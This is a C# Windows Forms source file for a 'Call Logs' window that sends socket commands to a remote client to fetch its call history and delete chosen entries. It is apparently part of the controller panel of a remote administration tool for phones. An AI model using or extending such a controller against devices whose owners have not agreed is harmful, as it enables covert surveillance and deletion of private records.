using System;
using System.Net.Sockets;
using System.Windows.Forms;

namespace SV
{
    public partial class CagriKayitlari : Form
    {
        Socket sock;
        public string ID = "";
        public CagriKayitlari(Socket sck, string aydi)
        {
            InitializeComponent();
            sock = sck; ID = aydi;
        }

        private void yenileToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                Form1.KomutGonder("CALLLOGS", "[VERI][0x09]", sock);
            }
            catch (Exception) { }
        }

        private void silToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listView1.SelectedItems.Count > 0)
            {
                try
                {
                    Form1.KomutGonder("DELETECALL", "[VERI]" + listView1.SelectedItems[0].SubItems[1].Text + "[VERI][0x09]", sock);
                    Text = "Çağrı Kayıtları";
                    listView1.SelectedItems[0].Remove();
                }
                catch (Exception) { }
            }
        }

        private void kopyalaToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listView1.SelectedItems.Count == 1)
            {
                Clipboard.SetText(listView1.SelectedItems[0].SubItems[1].Text);
            }
        }
    }
}
